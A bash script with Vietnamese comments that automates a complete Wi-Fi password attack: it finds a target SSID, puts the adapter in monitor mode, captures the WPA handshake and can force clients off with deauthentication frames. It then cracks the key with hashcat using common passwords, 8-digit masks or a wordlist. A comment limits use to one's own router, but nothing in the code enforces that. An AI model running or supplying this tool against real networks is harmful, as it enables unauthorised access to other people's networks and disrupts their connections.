#!/usr/bin/env bash
# MỘT SCRIPT LÀM HẾT: quét -> vào monitor -> bắt handshake (tự dừng khi có) -> dò pass.
# CHỈ dùng cho ROUTER CỦA BẠN.
#
#   ./auto.sh "TotolinkTầng 4"                      # bắt, rồi dò 8 chữ số (mặc định)
#   DEAUTH=1 ./auto.sh "TotolinkTầng 4"             # tự đá client để ép nối lại (bắt nhanh hơn)
#   ./auto.sh "TotolinkTầng 4" dict rockyou.txt     # dò bằng wordlist
#   ./auto.sh "TotolinkTầng 4" mask '?d?d?d?d?d?d?d?d'
#
# Cảnh báo: tắt NetworkManager để vào monitor -> MẤT MẠNG tới khi bắt xong (tự khôi phục).
set -uo pipefail
cd "$(dirname "$0")"

SSID="${1:?Thiếu SSID. Vd: ./auto.sh \"TotolinkTầng 4\"}"
MODE="${2:-auto}"; ARG="${3:-}"
SECS="${SECS:-180}"; DEAUTH="${DEAUTH:-0}"
PHYIF="$(iw dev 2>/dev/null | awk '/Interface/{print $2; exit}')"; PHYIF="${PHYIF:-wlan0}"

SCAN="$(nmcli -t -f SSID,BSSID,CHAN dev wifi list --rescan yes 2>/dev/null | sed 's/\\:/-/g')"
BSSID="$(echo "$SCAN" | awk -F: -v s="$SSID" '$1==s{print $2; exit}' | tr 'a-f-' 'A-F:')"
CHAN="$( echo "$SCAN" | awk -F: -v s="$SSID" '$1==s{print $3; exit}')"
[ -z "$BSSID" ] || [ -z "$CHAN" ] && { echo "Không thấy '$SSID'."; exit 1; }
echo "==> '$SSID'  BSSID=$BSSID  kênh=$CHAN  deauth=$DEAUTH"

MONIF=""; ADPID=""
cleanup(){
  [ -n "$ADPID" ] && kill "$ADPID" 2>/dev/null
  [ -n "$MONIF" ] && sudo airmon-ng stop "$MONIF" >/dev/null 2>&1
  sudo systemctl start NetworkManager >/dev/null 2>&1
}
trap 'cleanup' EXIT

rm -f cap-*.cap cap-*.csv cap-*.netxml cap-*.kismet* all.hc22000 cap.hc22000 cap.pot 2>/dev/null
echo "==> Vào monitor mode"
sudo airmon-ng check kill >/dev/null 2>&1
sudo airmon-ng start "$PHYIF" "$CHAN" >/dev/null 2>&1
MONIF="$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i; exit}')"
[ -z "$MONIF" ] && { echo "Không tạo được monitor."; exit 1; }

echo "==> Bắt handshake (tối đa ${SECS}s, tự dừng khi có)."
[ "$DEAUTH" != "1" ] && echo "    *** Tắt/bật WiFi 1 thiết bị đang nối '$SSID' để ép bắt tay lại ***"
sudo airodump-ng -c "$CHAN" --bssid "$BSSID" -w cap --output-format pcap "$MONIF" >/dev/null 2>&1 &
ADPID=$!

have_hs(){  # chuyển cap hiện tại -> hash; trả 0 nếu đã có hash hợp lệ của đúng ESSID
  local cap; cap="$(ls -1 cap-*.cap 2>/dev/null | head -1)"; [ -z "$cap" ] && return 1
  hcxpcapngtool -o all.hc22000 "$cap" >/dev/null 2>&1 || true
  [ -s all.hc22000 ] || return 1
  hcxhashtool -i all.hc22000 --essid="$SSID" -o cap.hc22000 >/dev/null 2>&1 || cp all.hc22000 cap.hc22000
  [ -s cap.hc22000 ]
}

for ((t=0; t<SECS; t+=5)); do
  sleep 5
  if [ "$DEAUTH" = "1" ] && [ $((t%15)) -eq 0 ]; then
    sudo aireplay-ng --deauth 3 -a "$BSSID" "$MONIF" >/dev/null 2>&1 || true
  fi
  if have_hs; then echo "   [${t}s] CÓ HANDSHAKE!"; break; fi
  echo "   [${t}s] chưa có..."
done
kill "$ADPID" 2>/dev/null; ADPID=""; sleep 1
have_hs || { echo ">>> Hết giờ chưa bắt được. Thử: DEAUTH=1 SECS=240 ./auto.sh \"$SSID\""; exit 1; }
echo "   hash: $(wc -l < cap.hc22000) dòng (loại $(cut -d'*' -f2 cap.hc22000|sort -u|tr '\n' ' '))"

cleanup; trap - EXIT        # khôi phục mạng trước khi dò (dò không cần monitor)

echo "==> Thử nhanh mật khẩu phổ biến..."
printf '%s\n' 12345678 123456789 1234567890 88888888 11111111 00000000 87654321 \
  password password1 admin123 qwertyui totolink123 > common.txt
rm -f cap.pot
hashcat -m 22000 cap.hc22000 common.txt --potfile-path cap.pot --quiet >/dev/null 2>&1 || true
if [ ! -s cap.pot ]; then
  case "$MODE" in
    dict) ATK=(-a 0 "${ARG:?Thiếu wordlist}");;
    mask) ATK=(-a 3 "${ARG:?Thiếu mask}");;
    auto) ATK=(-a 3 '?d?d?d?d?d?d?d?d');;   # 8 chữ số
  esac
  echo "==> Dò: hashcat -m 22000 cap.hc22000 ${ATK[*]}  (Ctrl-C để dừng)"
  hashcat -m 22000 cap.hc22000 "${ATK[@]}" --potfile-path cap.pot --status --status-timer 30 || true
fi
echo
if [ -s cap.pot ]; then echo ">>> CRACK ĐƯỢC: $(cut -d: -f5- cap.pot)"
else echo ">>> Chưa ra (pass không phải 8 chữ số / không có trong wordlist). Cần rockyou hoặc GPU."; fi
